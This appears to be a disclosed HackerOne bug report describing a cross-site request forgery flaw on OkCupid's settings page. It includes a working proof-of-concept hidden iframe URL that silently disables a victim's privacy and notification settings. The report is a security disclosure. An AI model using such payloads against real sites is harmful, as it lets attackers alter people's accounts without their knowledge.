@@ -1,0 +1,20 @@
+ReportLink:https://hackerone.com/reports/2957
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/melvin
+ReportedTo:OkCupid(okcupid)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:09.04.2014 15:14:08
+
+Summary:
+
+The page at `www.okcupid.com/settings`is not protected against Cross-Site Request Forgery (CSRF) attacks. This means that an attacker can trick users into clicking a link, which will immediately change the settings of a user, without the user even being aware of the changes.
+
+The attack works like this:
+
+An attacker creates a webpage on a (non-okcupid) website (for example: http://example.com/cat.html) and inserts a (hidden) iframe like this:
+
+`<iframe style="width:0px;height:0px" src="https://www.okcupid.com/settings?general=1&going_to=&submitbutton=1&email_pri={email of the victim}&newpassword1=&newpassword2=&oldpassword=&emailnotify=0&emailnotify=3&allowquickmatchnotifications=1&allowmutualmatchemails=1&allowquiveremails=1&allownewsletter=1&allowotheremails=1&allowstalkeremails=1&alloweventnotifications=1&submitbutton=1">`
+
+The attacker will have to know the email address of the victim. When the victim visits the page at http://example.com/cat.html, his/her OKCupid privacy **(!)** and notification settings will all be disabled in the background (see attachment: new_settings.png).
